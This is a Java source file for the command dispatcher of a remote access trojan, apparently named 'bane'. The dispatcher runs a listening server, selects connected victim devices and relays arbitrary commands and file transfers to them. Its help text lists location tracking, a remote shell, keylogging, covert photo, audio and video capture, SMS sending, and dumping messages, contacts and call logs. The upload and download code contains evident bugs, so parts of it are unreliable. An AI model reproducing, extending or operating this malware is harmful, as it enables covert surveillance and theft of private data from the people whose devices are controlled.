package bane.shell.dispatcher;

import bane.connection.Connection;
import bane.connection.device.Device;
import bane.shell.Shell;
import com.bane.model.*;
import java.io.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Base64;

public class ShellDispatcher extends Dispatcher {

    private Connection connection;

    public ShellDispatcher(Shell shell) {
        super(shell);
        super.dispatchMessage = shell.username+"\\shell> ";
    }

    @Override
    public void execute(String data) {
        if(data.equals("exit")){
            // exiting
            super.exit();
        } else if (data.equals("help")){
            this.help();
        } else if (data.equals("rat")){
            // setting the dispatcher as the rat dispatcher
            this.setDispatcher(new RatDispatcher(this.shell));
        } else if (data.contains("start")){
            int port = 8080;
            if(data.length() > 6){
                try {
                    port = Integer.parseInt(data.replace("start ", ""));
                } catch (Exception e){
                    port = 8080;
                }
            }
            // starting the connection
            this.connection = new Connection("0.0.0.0",port);
            this.connection.start();
        } else if (data.contains("select")){
            // setting the device
            this.connection.setCurrentDevice(data.replace("select ",""));
        } else if (data.contains("show")){
            // printing connected devices
            ArrayList<Device> devices = this.connection.devices;
            for (int i = 0; i < devices.size(); i++) {
                System.out.println(devices.get(i).name);
            }
        } else if(data.contains("upload")){
            if(this.connection.getCurrentDevice() != null) {
                String path = data.split(" ")[1];
                File file = new File(path);
                if(file.exists()){
                    String filename = file.getName();
                    try {
                        byte[] fileBytes = Base64.getEncoder().encode(Files.readAllBytes(Paths.get("file")));
                        this.connection.send(new BaneObject(BaneCode.REQUEST, "", new BaneValue[]{
                                new BaneValue<String>("filename", filename),
                                new BaneValue<String>("file", new String(fileBytes))
                        }));
                    } catch (Exception e) {
                        shell.print_nok(e.getMessage());
                    }
                } else {
                    shell.print_nok("File doesn't exist");
                }
            } else {
                shell.print_nok("No selected device");
            }
        } else {
            try {
                if(this.connection.getCurrentDevice() != null){
                    BaneObject response = this.connection.send(new BaneObject(BaneCode.REQUEST,"",new BaneValue[]{new BaneValue<String>("command",data)}));
                    if(response.message != null) {
                        this.shell.print_info(response.message);
                    }
                    if(response.values != null){
                        for (int i = 0; i < response.values.length; i++) {
                            if(response.values[i].key.equals("filename")){
                                File file = new File(((String) response.values[i].value));
                                file.createNewFile();
                                FileOutputStream fos = new FileOutputStream(file);
                                for (int j = 0; j < response.values.length; j++) {
                                    if(response.values[i].key.equals("file")){
                                        fos.write(Base64.getDecoder().decode(((String)response.values[i].value).getBytes()));
                                        fos.flush();
                                        fos.close();
                                        break;
                                    }
                                }
                            } else if(!response.values[i].key.equals("file")) {
                                this.shell.print_info((String) response.values[i].value);
                            }
                        }
                    }
                } else {
                    shell.print_nok("No selected device");
                }
            } catch (Exception e){
                shell.print_nok(e.getMessage());
            }
        }
    }

    @Override
    public void help() {
        System.out.println(
                "start (port)\tCreates the server at the specified port (optional)\n"+
                "show\tShows the devices connected to the bane service\n"+
                "sysinfo\tGet system info about the device"+
                "select <name>\tSelects the device\n"+
                "track\tTracks the current position of the device\n"+
                "sopen\tStarts a remote shell\n"+
                "sclose\tCloses the remote shell\n"+
                "news\tReturns the notifications\n"+
                "keylog\tKeylogs the device (In development)\n"+
                "photo\tTake photo (In development)\n"+
                "record -d <time>\tRecord audio (In development)\n"+
                "video -d <time>\tRecord video (In development)\n"+
                "upload <path>\tUploads a file (In development)\n" +
                "download <path>\tDownloads a file (In development)\n" +
                "name <new name>\tChanges the name of the current device\n"+
                "sendsms number \"text\"\tSends a message to a number"+
                "dump [sms/contacts/calls]\tGet all sms/contacts/calls"
        );
    }

    public Connection getConnection(){
        return this.connection;
    }

}
